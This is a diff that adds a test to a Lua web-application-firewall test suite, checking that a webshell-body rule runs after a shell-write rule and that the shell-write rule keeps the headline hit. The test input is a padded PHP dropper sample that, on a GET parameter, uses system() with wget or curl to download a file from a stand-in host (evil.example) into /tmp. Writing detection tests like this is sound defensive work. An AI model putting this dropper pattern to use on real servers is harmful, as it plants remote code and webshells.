@@ -154,6 +154,31 @@ check(det.detect_php_webshell_body("q=" .. string.rep("a%20b%2Fc%3Dd%3A", 2000),
 clean(req("--b\r\nContent-Disposition: form-data; name=\"msg\"\r\n\r\n" .. string.rep("Γεια σας, θα ήθελα πληροφορίες. ", 150) ..
           "\r\n--b--\r\n", "/contact", "multipart/form-data; boundary=b"), "multipart text form, no PHP")
 
+-- ── Order: 417 runs late, so the logonly body rules keep their headline ────
+-- cfm.lua pushes the headline hit alone. At step 15, 417 took the headline
+-- (and the push) of a wget || curl dropper from 331, a burn-in rule; it now
+-- runs after every rule but 612 and 530 and shows in also_rule_ids.
+do
+  waf.set_rule("rule_shell_write_exec", "logonly")  -- its shipped mode
+  local dropper = "<?php\n" .. string.rep("// padding line of a dropper script\n", 80) ..
+    "if(isset($_GET[\"x\"])){ $u=\"http://evil.example/a.txt\"; @system(\"wget -q $u -O /tmp/a.php || curl -s -o /tmp/a.php $u\"); }\n"
+  local hit, reason, _, _, hits, rid = waf.check(req("action=put&content=" .. urlenc(dropper)))
+  check(hit == true and rid == 331, "dropper: 331 keeps the headline (got " .. tostring(rid) .. " " .. tostring(reason) .. ")")
+  local also = waf.also_rule_ids(hits, rid) or {}
+  local seen = false
+  for _, id in ipairs(also) do if id == 417 then seen = true end end
+  check(seen, "dropper: 417 in also_rule_ids")
+  waf.set_rule("rule_shell_write_exec", "disabled")
+  -- Source order: 417's record sits after 331's and the 42x/43x scanners, before 612's.
+  local f = assert(io.open("configs/lua/cfm_waf.lua")); local src = f:read("*a"); f:close()
+  local at417 = src:find("RULE_IDS.rule_php_webshell_body_deep", 1, true)
+  local at331 = src:find("RULE_IDS.rule_shell_write_exec", 1, true)
+  local at43x = src:find("RULE_IDS.rule_htaccess_poisoning", 1, true)
+  local at612 = src:find("RULE_IDS.rule_fetch_metadata_missing", 1, true)
+  check(at417 and at331 and at43x and at612 and at331 < at417 and at43x < at417 and at417 < at612,
+        "417 runs after 331 / 430 and before 612")
+end
+
 -- ── Rule 415's tag names the file's extension (its burn-in needed it) ─────
 do
   local function mp(fname, data)
